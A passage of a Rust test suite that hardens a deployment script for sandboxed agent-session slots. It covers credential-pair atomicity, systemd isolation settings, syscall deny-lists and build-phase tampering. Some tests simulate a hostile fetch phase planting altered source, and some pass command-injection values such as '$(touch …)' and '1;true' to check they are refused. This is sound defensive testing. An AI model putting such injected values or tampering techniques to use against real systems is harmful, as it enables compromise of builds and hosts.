        script.contains("/tmp/agent-sign-build"),
        "the test swaps the script's work folder; it no longer names /tmp/agent-sign-build"
    );
    let copy = top.join("build-in-sandbox.sh");
    fs::write(
        &copy,
        script.replace("/tmp/agent-sign-build", &work.to_string_lossy()),
    )
    .unwrap();

    // The stand-in toolchain: install.sh puts a `cargo` stand-in in <prefix>/bin.
    let tc = top.join("tc/rust-stub-1");
    fs::create_dir_all(&tc).unwrap();
    fs::write(
        tc.join("install.sh"),
        "#!/bin/sh\nfor a in \"$@\"; do case \"$a\" in --prefix=*) p=${a#--prefix=} ;; esac; done\n\
         mkdir -p \"$p/bin\" && cp \"$(dirname \"$0\")/cargo-stub\" \"$p/bin/cargo\" && chmod 755 \"$p/bin/cargo\"\n",
    )
    .unwrap();
    fs::write(
        tc.join("cargo-stub"),
        "#!/bin/sh\n\
         case \"$1\" in\n\
         build)\n\
           d=\"$CARGO_HOME/registry/src/idx-1/foo-1.0.0\"\n\
           if [ -f \"$d/lib.rs\" ]; then cp \"$d/lib.rs\" \"$STUB_LOG/build-saw\"\n\
           else echo ABSENT > \"$STUB_LOG/build-saw\"; mkdir -p \"$d\"; echo 'extracted by cargo from the checked .crate' > \"$d/lib.rs\"; fi\n\
           if [ -e \"$CARGO_HOME/config.toml\" ]; then echo present; else echo absent; fi > \"$STUB_LOG/config-saw\"\n\
           if [ -f \"$CARGO_HOME/registry/cache/idx-1/foo-1.0.0.crate\" ]; then echo yes; else echo no; fi > \"$STUB_LOG/cache-saw\"\n\
           mkdir -p \"$CARGO_TARGET_DIR/release\"\n\
           for n in agent-sign agent-signd agent-launchd agent-git agent-ssh-sign; do echo x > \"$CARGO_TARGET_DIR/release/$n\"; done ;;\n\
         esac\nexit 0\n",
    )
    .unwrap();
    for f in ["install.sh", "cargo-stub"] {
        fs::set_permissions(tc.join(f), fs::Permissions::from_mode(0o755)).unwrap();
    }
    let toolchain = top.join("toolchain.tar.xz");
    assert!(
        Command::new("tar")
            .args(["-c", "-J", "-f"])
            .arg(&toolchain)
            .arg("-C")
            .arg(top.join("tc"))
            .arg("rust-stub-1")
            .status()
            .unwrap()
            .success(),
        "tar the stand-in toolchain"
    );
    let toolchain_sha = sha_hex(&fs::read(&toolchain).unwrap());

    // The source: a Cargo.lock naming one crate by its real hash.
    let crate_bytes = b"crate-bytes";
    let src = top.join("srcdir");
    fs::create_dir_all(&src).unwrap();
    fs::write(
        src.join("Cargo.lock"),
        format!(
            "version = 3\n\n[[package]]\nname = \"foo\"\nversion = \"1.0.0\"\nsource = \"registry+https://github.com/rust-lang/crates.io-index\"\nchecksum = \"{}\"\n",
            sha_hex(crate_bytes)
        ),
    )
    .unwrap();
    fs::write(
        src.join("Cargo.toml"),
        "[package]\nname = \"agent-sign\"\nversion = \"0.0.0\"\n",
    )
    .unwrap();
    let tar = |out: &Path, base: &Path, members: &[&str]| {
        assert!(
            Command::new("tar")
                .args(["-c", "-f"])
                .arg(out)
                .arg("-C")
                .arg(base)
                .args(members)
                .status()
                .unwrap()
                .success(),
            "tar {members:?}"
        );
    };
    tar(
        &work.join("source.tar"),
        &src,
        &["Cargo.lock", "Cargo.toml"],
    );

    // What a HOSTILE fetch phase hands over: the right toolchain and the right .crate, plus an
    // extracted source with changed code, and a cargo config.
    let fetched = top.join("fetched");
    fs::create_dir_all(fetched.join("cargo/registry/cache/idx-1")).unwrap();
    fs::create_dir_all(fetched.join("cargo/registry/src/idx-1/foo-1.0.0")).unwrap();
    fs::create_dir_all(fetched.join("cargo/registry/index/idx-1")).unwrap();
    fs::copy(&toolchain, fetched.join("toolchain.tar.xz")).unwrap();
    fs::write(
        fetched.join("cargo/registry/cache/idx-1/foo-1.0.0.crate"),
        crate_bytes,
    )
    .unwrap();
    fs::write(
        fetched.join("cargo/registry/src/idx-1/foo-1.0.0/lib.rs"),
        "PLANTED-BY-THE-FETCH-PHASE",
    )
    .unwrap();
    fs::write(fetched.join("cargo/registry/index/idx-1/config.json"), "{}").unwrap();
    fs::write(
        fetched.join("cargo/config.toml"),
        "[build]\nrustc-wrapper = \"/bin/false\"\n",
    )
    .unwrap();
    tar(
        &work.join("fetched.tar"),
        &fetched,
        &["toolchain.tar.xz", "cargo"],
    );

    let out = Command::new("bash")
        .arg(&copy)
        .arg("compile")
        .current_dir(top)
        .env_clear()
        .env("PATH", "/usr/bin:/bin")
        .env("TOOLCHAIN_SHA256", &toolchain_sha)
        .env("RUST_VERSION", "1.0.0")
        .env("STUB_LOG", &logd)
        .stdin(Stdio::null())
        .output()
        .expect("start bash");
    let err = String::from_utf8_lossy(&out.stderr).to_string();
    assert!(
        out.status.success(),
        "S5: the compile phase failed on a good .crate and a good toolchain:\n{err}"
    );
    let saw = fs::read_to_string(logd.join("build-saw")).unwrap_or_default();
    assert!(
        !saw.contains("PLANTED-BY-THE-FETCH-PHASE"),
        "S5: cargo found the source folder the fetch phase extracted (registry/src), so a changed source builds although its .crate is right"
    );
    assert_eq!(
        fs::read_to_string(logd.join("cache-saw"))
            .unwrap_or_default()
            .trim(),
        "yes",
        "S5: the checked .crate must still be handed to cargo (registry/cache)"
    );
    assert_eq!(
        fs::read_to_string(logd.join("config-saw"))
            .unwrap_or_default()
            .trim(),
        "absent",
        "S5: a cargo config from the fetch phase reached the compile phase"
    );
}

// ---------------------------------------------------------------- S6: the login pair moves as one

/// S6. `move_login` replaces the secret ID and the role ID with two separate `mv` calls. If
/// the second fails, a NEW secret is paired with the OLD role. Required: whichever way the
/// replacement is made, a run that stops leaves the stored pair entirely the old one
/// (restored), with the delivered login kept and no `.new` or `.old` file in the store; a
/// design that cannot fail between two moves (one rename of the pair) shows up as a run
/// that succeeds with the whole new pair.
///
/// A stand-in `mv` fails the SECOND move of a `.new` file onto a stored login file, once.
///
/// Fails today: the secret is already the new one when the run stops.
#[test]
fn s6_a_failing_second_move_never_leaves_a_new_secret_with_an_old_role() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the first run");
    m.put(DELIVERED_LOGIN, &b64(NEW_SECRET_ID), 0o600);
    let counter = m.log.join("login-mv-count");
    let p = m.stubs.join("mv");
    fs::write(
        &p,
        format!(
            "#!/bin/sh\nsrc=''; dst=''\n\
             for a in \"$@\"; do case \"$a\" in -*) ;; *) [ -z \"$src\" ] && src=$a; dst=$a ;; esac; done\n\
             case \"$src:$dst\" in\n\
               *credstore.encrypted/agent-sign.*.new:*credstore.encrypted/agent-sign.*)\n\
                 n=$(cat '{c}' 2>/dev/null || echo 0); n=$((n + 1)); echo $n > '{c}'\n\
                 if [ $n -eq 2 ]; then echo 'mv: stand-in made the second login move fail' >&2; exit 1; fi ;;\n\
             esac\nexec /usr/bin/mv \"$@\"\n",
            c = counter.display()
        ),
    )
    .unwrap();
    fs::set_permissions(&p, fs::Permissions::from_mode(0o755)).unwrap();

    let run = m.sitting(&[]);
    let moves: u32 = fs::read_to_string(&counter)
        .ok()
        .and_then(|s| s.trim().parse().ok())
        .unwrap_or(0);
    let secret = decoded(&m, STORED_SECRET_REL);
    let role = decoded(&m, STORED_ROLE_REL);
    assert_eq!(
        role.as_deref(),
        Some(LOGIN_NAME),
        "S6: the stored role ID is not the login's"
    );
    if moves >= 2 {
        // The replacement does take two moves, and the second failed.
        must_stop_plainly(
            &run,
            "the second login move fails",
            &["login", "move", "stored"],
        );
        assert_eq!(
            secret.as_deref(),
            Some(SECRET_ID),
            "S6: the second move failed and the stored secret ID is no longer the old one ({secret:?}): a new secret is paired with the old role"
        );
        assert!(
            m.exists(DELIVERED_LOGIN),
            "S6: the delivered login was removed although the move failed"
        );
    } else {
        // No two separate moves: the pair is replaced as one, so the run succeeds with the whole new pair.
        must_succeed(&run, "the pair is replaced as one");
        assert_eq!(secret.as_deref(), Some(NEW_SECRET_ID));
        assert!(!m.exists(DELIVERED_LOGIN));
    }
    let mut left: Vec<String> = fs::read_dir(m.path("etc/credstore.encrypted"))
        .unwrap()
        .flatten()
        .map(|e| e.file_name().to_string_lossy().to_string())
        .collect();
    left.sort();
    assert_eq!(
        left,
        vec!["agent-sign.role-id", "agent-sign.secret-id"],
        "S6: a .new or .old file was left in the credential store"
    );
}

// ---------------------------------------------------------------- R1 / R2: round-2 leftovers

/// R1. Both build phases (fetch, compile) run build code that can be hostile. With the
/// default `ProtectProc=default` they see every other process in `/proc` (command lines,
/// working folders), so each must carry `ProtectProc=invisible`. `ProcSubset=pid` is
/// deliberately NOT set: build tools read `/proc/cpuinfo` and similar, and an untested break
/// at the real sitting costs more than it saves.
///
/// Static: reads the recorded `systemd-run` arguments.
///
/// Fails today: neither phase sets `ProtectProc`.
#[test]
fn r1_both_build_phases_hide_other_processes_in_proc_and_keep_the_rest_of_proc() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the run");
    let (fetch, compile) = fetch_and_compile(&m);
    for (name, call) in [("fetch", &fetch), ("compile", &compile)] {
        assert_eq!(
            props(call, "ProtectProc"),
            vec!["invisible".to_string()],
            "R1: the {name} phase must set ProtectProc=invisible exactly once: {call:?}"
        );
        assert!(
            props(call, "ProcSubset").is_empty(),
            "R1: the {name} phase must not set ProcSubset (build tools read /proc/cpuinfo): {call:?}"
        );
    }
}

/// What a stop after a rollback printed once the rollback itself had spoken: everything
/// after the line that starts "Rolling back".
fn after_rollback_notice(text: &str) -> String {
    let at = text
        .find("Rolling back")
        .unwrap_or_else(|| panic!("R2: the rollback did not run:\n{text}"));
    let rest = &text[at..];
    match rest.find('\n') {
        Some(i) => rest[i + 1..].to_string(),
        None => String::new(),
    }
}

/// R2's shared check: after the rollback, the closing text must say what was rolled back
/// (system.toml restored or moved aside, and the units stopped) and must not claim that
/// nothing changed.
fn assert_closing_names_the_rollback(text: &str, what: &str) {
    assert!(
        !text.contains("Nothing after this point was changed"),
        "R2 ({what}): the stop still says nothing was changed after a rollback that changed things back:\n{text}"
    );
    let closing = after_rollback_notice(text).to_lowercase();
    assert!(
        closing.contains("system.toml"),
        "R2 ({what}): the closing text after the rollback does not name system.toml:\n{text}"
    );
    assert!(
        ["restored", "put back", "moved aside", "rolled back"]
            .iter()
            .any(|w| closing.contains(w)),
        "R2 ({what}): the closing text does not say system.toml was restored, put back or moved aside:\n{text}"
    );
    assert!(
        closing.contains("stopped") || closing.contains("units"),
        "R2 ({what}): the closing text does not say the units were stopped:\n{text}"
    );
}

/// R2, a first run: the health check fails, system.toml is moved aside and the units are
/// stopped; the closing text must say so and never "Nothing after this point was changed".
///
/// Fails today: lib.sh prints that sentence after every stop, rollback or not.
#[test]
fn r2_after_a_first_run_rollback_the_stop_says_what_was_rolled_back_not_that_nothing_changed() {
    let m = Machine::new();
    fs::write(m.log.join("unhealthy-doctor"), "").unwrap();
    let run = m.sitting(&[]);
    must_stop_plainly(
        &run,
        "the service starts but is never healthy",
        &["agent-signd", "healthy", "service", "ping"],
    );
    assert_closing_names_the_rollback(&run.text(), "first run");
}

/// R2, a rerun: the earlier system.toml is put back; the closing text must say so.
///
/// Fails today: same sentence as the first run.
#[test]
fn r2_after_a_rerun_rollback_the_stop_says_what_was_rolled_back_not_that_nothing_changed() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the first run");
    fs::write(m.log.join("unhealthy-doctor"), "").unwrap();
    let run = m.sitting(&["--slots", "9"]);
    must_stop_plainly(
        &run,
        "the rerun's service is never healthy",
        &["agent-signd", "healthy", "service", "ping"],
    );
    assert_closing_names_the_rollback(&run.text(), "rerun");
}

/// F2: after a rerun's rollback the units are stopped and disabled, so the
/// closing text must not imply an earlier healthy deployment keeps running.
#[test]
fn r2_after_a_rerun_rollback_the_closing_does_not_imply_the_earlier_deployment_keeps_running() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the first run");
    fs::write(m.log.join("unhealthy-doctor"), "").unwrap();
    let run = m.sitting(&["--slots", "9"]);
    must_stop_plainly(
        &run,
        "the rerun's service is never healthy",
        &["agent-signd", "healthy", "service", "ping"],
    );
    let closing = after_rollback_notice(&run.text()).to_lowercase();
    for bad in [
        "keeps running",
        "still running",
        "continues to run",
        "left running",
        "stays running",
        "earlier deployment is unaffected",
    ] {
        assert!(
            !closing.contains(bad),
            "closing implies the earlier deployment runs ({bad}):\n{closing}"
        );
    }
    assert!(
        closing.contains("stopped") && closing.contains("disabled"),
        "closing must say the units were stopped and disabled:\n{closing}"
    );
}

// ================================================================ round 2 whole-branch review: M2, L5, L2 (units)
//
// Written BEFORE the fixes, by an agent other than their builder, against f61ed17.
// Interfaces I-M2, I-L5 and the MemoryMax part of I-L2 come from the orchestrator.
// Unit-file settings are checked by parsing the unit files in the repository and the
// copies the sitting installs on a throwaway root; what the kernel and systemd do with
// them is not testable here (see the report: /dev/shm, keyring and syscall behaviour,
// bwrap under the filter, MemoryMax kills, all need a real machine).

const SLOT_UNITS: [&str; 2] = ["agent-session@.service", "agent-session-end@.service"];

fn source_unit(name: &str) -> String {
    fs::read_to_string(sitting_dir().join("files").join(name))
        .unwrap_or_else(|e| panic!("{name}: {e}"))
}

/// All values of one directive, in file order.
fn values_of(text: &str, key: &str) -> Vec<String> {
    unit_directives(text)
        .into_iter()
        .filter(|(k, _)| k == key)
        .map(|(_, v)| v)
        .collect()
}

/// System calls a unit denies, and whether any `SystemCallFilter=` line is an allow-list
/// (no leading `~`), which would turn the deny-list into an allow-list.
fn denied_calls(text: &str) -> (BTreeSet<String>, bool) {
    let mut denied = BTreeSet::new();
    let mut allow_list = false;
    for v in values_of(text, "SystemCallFilter") {
        let mut words = v.split_whitespace().peekable();
        match words.peek() {
            Some(w) if w.starts_with('~') => {
                for w in words {
                    denied.insert(w.trim_start_matches('~').to_string());
                }
            }
            Some(_) => allow_list = true,
            None => {}
        }
    }
    (denied, allow_list)
}

fn comments_of(text: &str) -> String {
    text.lines()
        .map(str::trim)
        .filter(|l| l.starts_with('#'))
        .collect::<Vec<_>>()
        .join("\n")
}

/// M2, I-M2, in the unit files. The slot's own /dev/shm: a fresh tmpfs per session that
/// programs can still write to (mode 1777, not read-only), because PrivateDevices
/// bind-mounts the HOST's /dev/shm and PrivateTmp/PrivateIPC don't cover it.
///
/// Fails today: neither unit has a TemporaryFileSystem for /dev/shm.
#[test]
fn m2_both_slot_units_get_a_fresh_writable_dev_shm() {
    for name in SLOT_UNITS {
        let text = source_unit(name);
        let entries: Vec<String> = values_of(&text, "TemporaryFileSystem")
            .iter()
            .flat_map(|v| v.split_whitespace().map(String::from).collect::<Vec<_>>())
            .collect();
        let shm: Vec<&String> = entries
            .iter()
            .filter(|e| e.split(':').next() == Some("/dev/shm"))
            .collect();
        assert_eq!(
            shm.len(),
            1,
            "M2: {name} must have exactly one TemporaryFileSystem entry for /dev/shm: {entries:?}"
        );
        let opts: Vec<&str> = shm[0].split(':').nth(1).unwrap_or("").split(',').collect();
        assert!(
            opts.contains(&"mode=1777"),
            "M2: {name}: /dev/shm must be mode=1777: {}",
            shm[0]
        );
        assert!(
            !opts.contains(&"ro") && !opts.contains(&"noexec"),
            "M2: {name}: programs must still be able to use /dev/shm (no ro, no noexec): {}",
            shm[0]
        );
        // The earlier entry (the slots folder, read-only) is untouched.
        assert!(
            entries.iter().any(|e| e == "/var/lib/agent-slots:ro"),
            "{name}: the existing TemporaryFileSystem=/var/lib/agent-slots:ro must stay: {entries:?}"
        );
    }
}

/// M2, I-M2, in the unit files. Nothing in the slot can put a key in the user keyring
/// (it survives between sessions of the same uid): add_key, keyctl and request_key are
/// denied with EPERM, and the filter is a deny-list.
///
/// Fails today: no SystemCallFilter, no SystemCallErrorNumber.
#[test]
fn m2_both_slot_units_deny_the_keyring_calls_with_eperm() {
    for name in SLOT_UNITS {
        let text = source_unit(name);
        let (denied, allow_list) = denied_calls(&text);
        assert!(
            !allow_list,
            "M2: {name}: SystemCallFilter must be a deny-list"
        );
        for call in ["add_key", "keyctl", "request_key"] {
            assert!(
                denied.contains(call),
                "M2: {name} must deny {call}: denied = {denied:?}"
            );
        }
        assert_eq!(
            values_of(&text, "SystemCallErrorNumber"),
            vec!["EPERM".to_string()],
            "M2: {name}: denied calls must fail with EPERM, not kill the program"
        );
    }
}

/// M2 and I-M2, the sitting's own D6 end check, run for real (its function, stand-in
/// `agent-sign`). The first session must leave something in /dev/shm and try to put a key
/// in @u; the second must look for both. If `keyctl` isn't installed the check must say so
/// and read /proc/keys instead; never a silent pass.
///
/// The stand-in records the shell script of each launch. This is a text check on those
/// scripts (the keyring and /dev/shm of the machine running the tests are never touched).
///
/// Fails today: the scripts only touch $TMPDIR and $HOME/..
#[test]
fn m2_the_d6_end_check_leaves_a_shm_file_and_tries_a_key_in_the_first_session_and_looks_for_both_in_the_second()
 {
    let (_e, ok, first, second) = run_d6_check("fresh");
    assert!(
        ok,
        "the check should pass when the second session prints fresh"
    );
    assert!(
        first.contains("/dev/shm/leftover-sitting"),
        "M2: the first session must write /dev/shm/leftover-sitting: {first}"
    );
    assert!(
        first.contains("@u") && (first.contains("add_key") || first.contains("keyctl")),
        "M2: the first session must try to add a key to the user keyring @u: {first}"
    );
    assert!(
        second.contains("/dev/shm/leftover-sitting"),
        "M2: the second session must look for the /dev/shm file: {second}"
    );
    assert!(
        second.contains("@u") || second.contains("/proc/keys"),
        "M2: the second session must look in @u (or /proc/keys): {second}"
    );
    // The existing leftovers are still checked.
    assert!(second.contains("leftover-sitting") && second.contains("LEFTOVER"));
    // keyctl missing: say so, and fall back to /proc/keys (never a silent pass).
    let both = format!("{first}\n{second}");
    assert!(
        (both.contains("command -v keyctl")
            || both.contains("type keyctl")
            || both.contains("which keyctl"))
            && both.contains("/proc/keys"),
        "M2: with keyctl not installed the check must say so and read /proc/keys instead: {both}"
    );
    assert!(
        both.to_lowercase().contains("keyctl is not installed")
            || both.to_lowercase().contains("keyctl isn't installed")
            || both.to_lowercase().contains("keyctl not installed")
            || both.to_lowercase().contains("no keyctl"),
        "M2: the fallback must print a plain sentence saying keyctl isn't installed: {both}"
    );
}

/// M2, regression guard (passes today and must keep passing): a second session that
/// reports a leftover fails the check; so does one that prints nothing recognisable.
#[test]
fn m2_guard_the_d6_end_check_fails_when_the_second_session_finds_a_leftover() {
    let (_e, ok, _, _) = run_d6_check("LEFTOVER");
    assert!(!ok, "a leftover in the second session must fail the check");
    let (_e, ok, _, _) = run_d6_check("");
    assert!(!ok, "no 'fresh' line must fail the check");
}

/// Runs the sitting's real `slot_leftovers_trashed` with a stand-in `agent-sign launch`
/// that records each launch's script (the last argument) and prints what the test says
/// for the second launch. Returns (env, passed, first script, second script).
fn run_d6_check(second_output: &str) -> (EndCheckEnv, bool, String, String) {
    let e = EndCheckEnv::new();
    let b = e.bin.display().to_string();
    fs::write(e.bin.join("out-1"), "").unwrap();
    fs::write(e.bin.join("out-2"), format!("{second_output}\n")).unwrap();
    e.stub(
        "agent-sign",
        "d=$(dirname \"$0\")\nn=$(cat \"$d/count\" 2>/dev/null || echo 0); n=$((n+1)); echo $n > \"$d/count\"\n\
         for a in \"$@\"; do last=$a; done\nprintf %s \"$last\" > \"$d/launch-$n\"\n\
         echo \"agent-sign: session $n in slot 3: started\"\ncat \"$d/out-$n\"\n",
    );
    fs::create_dir_all(e.bin.join("slots/3/trash/old")).unwrap();
    fs::create_dir_all(e.bin.join("state")).unwrap();
    fs::write(
        e.bin.join("state/sessions.log"),
        "{\"slot\": 3, \"x\": 1}\n",
    )
    .unwrap();
    let script = format!(
        "set -u\nexport PATH='{b}:/usr/bin:/bin'\nCURRENT_BIN='{b}'\nSLOTS_ROOT='{b}/slots'\nLAUNCH_STATE='{b}/state'\n\
         forget_sudo() {{ :; }}\nas_root() {{ shift; \"$@\"; }}\n{fns}\nif slot_leftovers_trashed; then echo YES; else echo NO; fi\n",
        fns = shell_fn_text(&["slot_leftovers_trashed"]),
    );
    let f = e.bin.join("harness-d6.sh");
    fs::write(&f, script).unwrap();
    let out = Command::new("bash")
        .arg(&f)
        .env_clear()
        .env("PATH", format!("{b}:/usr/bin:/bin"))
        .output()
        .expect("start bash");
    let so = String::from_utf8_lossy(&out.stdout).trim().to_string();
    let ok = match so.as_str() {
        "YES" => true,
        "NO" => false,
        other => panic!(
            "the D6 harness printed {other:?}; stderr: {}",
            String::from_utf8_lossy(&out.stderr)
        ),
    };
    let first = fs::read_to_string(e.bin.join("launch-1")).unwrap_or_default();
    let second = fs::read_to_string(e.bin.join("launch-2")).unwrap_or_default();
    (e, ok, first, second)
}

/// L5, I-L5, in the unit files. Both slot units: native architecture only, and a
/// deny-list of the dangerous groups (plus the keyring calls, tested above), failing with EPERM.
///
/// Fails today: neither unit has any of these.
#[test]
fn l5_both_slot_units_have_native_architecture_and_the_deny_list_of_system_call_groups() {
    for name in SLOT_UNITS {
        let text = source_unit(name);
        assert_eq!(
            values_of(&text, "SystemCallArchitectures"),
            vec!["native".to_string()],
            "L5: {name}: SystemCallArchitectures=native"
        );
        let (denied, allow_list) = denied_calls(&text);
        assert!(!allow_list, "L5: {name}: the filter must be a deny-list");
        for g in [
            "@clock",
            "@cpu-emulation",
            "@module",
            "@raw-io",
            "@reboot",
            "@swap",
            "@obsolete",
        ] {
            assert!(
                denied.contains(g),
                "L5: {name} must deny {g}: denied = {denied:?}"
            );
        }
        // A deny-list must not take away what bubblewrap and ordinary programs need.
        for needed in [
            "@system-service",
            "@default",
            "unshare",
            "clone",
            "mount",
            "setns",
        ] {
            assert!(
                !denied.contains(needed),
                "L5: {name} must not deny {needed}: agents' sandboxes need user namespaces"
            );
        }
        assert_eq!(
            values_of(&text, "SystemCallErrorNumber"),
            vec!["EPERM".to_string()]
        );
    }
}

/// L5, I-L5, in the unit files. No RestrictNamespaces (agents' own sandboxes, such as
/// Claude Code's bubblewrap on Linux, need user namespaces), and the unit says why in a comment.
///
/// Fails today: no comment explains it (the absence of the directive passes today).
#[test]
fn l5_slot_units_have_no_restrict_namespaces_and_say_why_in_a_comment() {
    for name in SLOT_UNITS {
        let text = source_unit(name);
        assert!(
            values_of(&text, "RestrictNamespaces").is_empty(),
            "L5: {name} must not set RestrictNamespaces (bubblewrap needs user namespaces)"
        );
        let c = comments_of(&text).to_lowercase();
        assert!(
            (c.contains("bubblewrap") || c.contains("bwrap")) && c.contains("restrictnamespaces"),
            "L5: {name}: a comment must say why RestrictNamespaces is left out (bubblewrap): {c}"
        );
    }
}

/// L5 and I-L5, in the unit files. Memory and task limits on both slot units, with the
/// measured defaults 50% and 15% (systemd's percentage forms).
///
/// Fails today: neither unit has MemoryMax or TasksMax.
#[test]
fn l5_both_slot_units_default_to_memory_max_50_percent_and_tasks_max_15_percent() {
    for name in SLOT_UNITS {
        let text = source_unit(name);
        assert_eq!(
            values_of(&text, "MemoryMax"),
            vec!["50%".to_string()],
            "L5: {name}: MemoryMax=50%"
        );
        assert_eq!(
            values_of(&text, "TasksMax"),
            vec!["15%".to_string()],
            "L5: {name}: TasksMax=15%"
        );
    }
}

/// The units the sitting installs, on a throwaway root, for the given extra arguments.
fn installed_slot_units(extra: &[&str]) -> (Machine, Vec<(String, String)>) {
    let m = Machine::new();
    must_succeed(&m.sitting(extra), "the run");
    let units = SLOT_UNITS
        .iter()
        .map(|n| (n.to_string(), unit_text(&m, n)))
        .collect();
    (m, units)
}

/// M2, L5, I-M2 and I-L5, the installed copies (the sitting may template the files): the
/// default run installs the /dev/shm tmpfs, the keyring and group filters, the
/// architecture, and the 50% / 15% limits in both units.
///
/// Fails today: none of them is in the installed units.
#[test]
fn m2_l5_the_installed_slot_units_carry_the_same_settings_by_default() {
    let (_m, units) = installed_slot_units(&[]);
    for (name, text) in &units {
        assert!(
            values_of(text, "TemporaryFileSystem").iter().any(|v| v
                .split_whitespace()
                .any(|e| e.starts_with("/dev/shm:") && e.contains("mode=1777"))),
            "installed {name}: no /dev/shm tmpfs\n{text}"
        );
        let (denied, allow_list) = denied_calls(text);
        assert!(!allow_list);
        for c in [
            "add_key",
            "keyctl",
            "request_key",
            "@clock",
            "@module",
            "@obsolete",
        ] {
            assert!(
                denied.contains(c),
                "installed {name} must deny {c}: {denied:?}"
            );
        }
        assert_eq!(values_of(text, "SystemCallArchitectures"), vec!["native"]);
        assert_eq!(values_of(text, "SystemCallErrorNumber"), vec!["EPERM"]);
        assert_eq!(
            values_of(text, "MemoryMax"),
            vec!["50%"],
            "installed {name}"
        );
        assert_eq!(values_of(text, "TasksMax"), vec!["15%"], "installed {name}");
        assert!(values_of(text, "RestrictNamespaces").is_empty());
    }
}

/// L5, I-L5: `--slot-memory-max` and `--slot-tasks-max` are written into both slot units
/// (a size or a percentage for memory; a count or a percentage for tasks), a rerun with
/// the same values changes nothing, and a rerun with other values updates the units.
///
/// Fails today: the sitting refuses both flags as unknown arguments.
#[test]
fn l5_slot_memory_max_and_slot_tasks_max_are_written_into_both_units_and_rerun_cleanly() {
    let (m, units) = installed_slot_units(&["--slot-memory-max", "2G", "--slot-tasks-max", "500"]);
    for (name, text) in &units {
        assert_eq!(values_of(text, "MemoryMax"), vec!["2G"], "{name}");
        assert_eq!(values_of(text, "TasksMax"), vec!["500"], "{name}");
    }
    let after_first = m.snap();
    let n = m.mutations().len();
    must_succeed(
        &m.sitting(&["--slot-memory-max", "2G", "--slot-tasks-max", "500"]),
        "the same run again",
    );
    let d = diff(&after_first, &m.snap());
    assert!(
        d.is_empty(),
        "the same flags again changed the machine: {d:?}"
    );
    assert!(
        m.mutations()[n..].is_empty(),
        "the same flags again asked for changes: {:?}",
        &m.mutations()[n..]
    );
    // Other values, percentages this time.
    must_succeed(
        &m.sitting(&["--slot-memory-max", "30%", "--slot-tasks-max", "10%"]),
        "a rerun with percentages",
    );
    for n in SLOT_UNITS {
        let t = unit_text(&m, n);
        assert_eq!(
            values_of(&t, "MemoryMax"),
            vec!["30%"],
            "{n} after the rerun"
        );
        assert_eq!(
            values_of(&t, "TasksMax"),
            vec!["10%"],
            "{n} after the rerun"
        );
    }
    // The flags are in --help.
    let help = m.run_with(&["--help"], PREFIX, &[]);
    assert!(
        help.stdout.contains("--slot-memory-max") && help.stdout.contains("--slot-tasks-max"),
        "--help must describe both flags\n{}",
        help.stdout
    );
}

/// L5, I-L5: a value that is neither a percentage (1 to 100) nor a size/count is refused
/// before any change, with a plain message naming the flag; a command in the value is
/// never run.
///
/// Fails today: the flags are unknown (the message names neither the flag's value nor
/// a rule; the test requires the flag's name and that nothing changed, and the valid
/// control run in the test above fails first).
#[test]
fn l5_a_bad_slot_limit_is_refused_before_any_change_naming_the_flag() {
    for flag in ["--slot-memory-max", "--slot-tasks-max"] {
        // Control: a good value is accepted (so a flag that is simply unknown can't pass).
        let m = Machine::new();
        must_succeed(&m.sitting(&[flag, "25%"]), &format!("{flag} 25%"));
        for bad in [
            "abc", "-1", "", "0", "0%", "101%", "%", "1;true", "5 0", "50%%", "2GB;x",
        ] {
            let m = Machine::new();
            let before = m.snap();
            let run = m.sitting(&[flag, bad]);
            must_stop_plainly(&run, &format!("{flag} {bad:?}"), &[flag]);
            assert!(
                diff(&before, &m.snap()).is_empty() && m.mutations().is_empty(),
                "{flag} {bad:?}: the machine changed"
            );
        }
        let m = Machine::new();
        let marker = m.top.join("pwned-limit");
        let bad = format!("$(touch {})", marker.display());
        let run = m.sitting(&[flag, &bad]);
        must_stop_plainly(&run, &format!("{flag} with a command in it"), &[flag]);
        assert!(!marker.exists(), "{flag}: the value was executed");
        assert!(m.mutations().is_empty());
    }
}

/// A size in bytes from a systemd size value (`2G`, `2048M`, `1536M`, `2147483648`);
/// `None` for a percentage or anything else.
fn size_bytes(v: &str) -> Option<u64> {
    let v = v.trim();
    let (num, mult) = match v.chars().last()? {
        'K' => (&v[..v.len() - 1], 1u64 << 10),
        'M' => (&v[..v.len() - 1], 1 << 20),
        'G' => (&v[..v.len() - 1], 1 << 30),
        'T' => (&v[..v.len() - 1], 1 << 40),
        c if c.is_ascii_digit() => (v, 1),
        _ => return None,
    };
    num.parse::<u64>().ok().map(|n| n * mult)
}

/// L2 (MemoryMax), I-L5. agent-launchd.service gets an absolute MemoryMax derived from
/// the launcher's own limits: it must hold the largest request (512 MiB, a person's
/// account or a verified approval) times the requests read at once (4), so a legitimate
/// launch is never killed, and the arithmetic must be in a comment.
///
/// Fails today: no MemoryMax.
#[test]
fn l2_the_launcher_unit_has_a_memory_max_that_holds_four_largest_requests_with_the_arithmetic_in_a_comment()
 {
    let text = source_unit("agent-launchd.service");
    let v = values_of(&text, "MemoryMax");
    assert_eq!(
        v.len(),
        1,
        "L2: agent-launchd.service needs one MemoryMax: {v:?}"
    );
    let bytes = size_bytes(&v[0]).unwrap_or_else(|| {
        panic!(
            "L2: MemoryMax must be an absolute size derived from the limits, not {:?}",
            v[0]
        )
    });
    let floor = 4 * 512 * (1u64 << 20);
    assert!(
        bytes >= floor,
        "L2: MemoryMax={} is below 4 x 512 MiB = {floor} bytes: a legitimate launch would be killed",
        v[0]
    );
    let c = comments_of(&text);
    assert!(
        c.contains("MemoryMax") && c.contains("512") && c.contains('4'),
        "L2: a comment must show the arithmetic (largest request 512 MiB, 4 at once, headroom): {c}"
    );
    // Installed too.
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the run");
    let installed = unit_text(&m, "agent-launchd.service");
    assert_eq!(values_of(&installed, "MemoryMax"), v, "installed copy");
}

/// L5 and I-L5, docs. docs/system-mode.md says the slots' Trash and the kept bundles are
/// never emptied (disk can fill), that the planned sweep covers kept bundles, and
/// records the filter and the limits and why RestrictNamespaces is left out; the sitting's README
/// names the two new flags.
///
/// Fails today: none of this is in the docs.
#[test]
fn l5_docs_name_the_disk_risk_the_sweep_the_limits_and_the_namespaces_decision() {
    let root = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let doc = fs::read_to_string(root.join("docs/system-mode.md")).unwrap();
    let at = doc
